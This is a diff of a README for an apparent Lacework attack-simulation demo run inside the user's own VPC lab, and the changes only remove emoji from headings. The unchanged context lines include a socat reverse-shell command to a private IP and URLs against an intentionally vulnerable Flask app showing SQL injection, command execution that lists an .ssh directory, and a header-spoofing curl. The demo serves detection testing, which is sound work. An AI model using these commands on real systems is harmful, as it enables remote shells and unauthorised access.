@@ -5,7 +5,7 @@ This demo simulates various types of attacks within your **own VPC environment**
 ![image](https://github.com/user-attachments/assets/10402fa0-0c8f-4911-a89b-4795f1ff6b81)
 
 
-> ⚠️ **IMPORTANT:** All tests must be run within your **own VPC lab environment**. 
+> **IMPORTANT:** All tests must be run within your **own VPC lab environment**. 
 
 ---
 
@@ -28,14 +28,14 @@ Note: The above are intended for Lacework to detect these VM "Internet Exposure"
 
 ---
 
-## 🧰 Attacker VM Setup
+## Attacker VM Setup
 
 1. **Install Docker**
 2. **Deploy Lacework Agent**
 
 ---
 
-## 🎯 Victim VM Setup
+## Victim VM Setup
 
 1. **Install dependencies**
    ```
@@ -69,7 +69,7 @@ Note: The above are intended for Lacework to detect these VM "Internet Exposure"
 
 ---
 
-# ▶️ Running the Simulation
+# Running the Simulation
 
 ## On the Attacker VM (Open 2 Terminals or use screen)
 
@@ -100,7 +100,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
 ```
 ---
 
-# 🚀 HOWTO run the Demo
+# HOWTO run the Demo
 
 **On the Attacker VM**
 
@@ -118,7 +118,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
 
 # Owasp Attacks: These are for your own inspiration
 
-### 🔓 Remote Command Execution (RCE)
+### Remote Command Execution (RCE)
 
 Submit OS commands via the vulnerable Flask app:
 
@@ -129,7 +129,7 @@ Submit OS commands via the vulnerable Flask app:
 http://<victim>:5000/user?id=123
 http://<victim>:5000/user?id=1%20OR%201=1
 
-### 💬 Reflected XSS
+### Reflected XSS
 
 Test for reflected XSS using the greet endpoint:
 
@@ -162,7 +162,7 @@ http://localhost:5000/cmd?exec=ll%20.ssh%20/"](http://3.96.142.208:5000/cmd?exec
 
 ---
 
-### 🌐 Client IP Logging
+### Client IP Logging
 
 Test client IP extraction:
 
@@ -176,7 +176,7 @@ curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
 
 ---
 
-## 🚨 Known Bad IPs for Simulation (Use with Caution)
+## Known Bad IPs for Simulation (Use with Caution)
 
 | IP Address       | Description                                   |
 |------------------|-----------------------------------------------|
@@ -191,7 +191,7 @@ curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
 
 ---
 
-## ✅ Happy Demo!
+## Happy Demo!
 
 Happy testing — use responsibly in isolated environments.
 
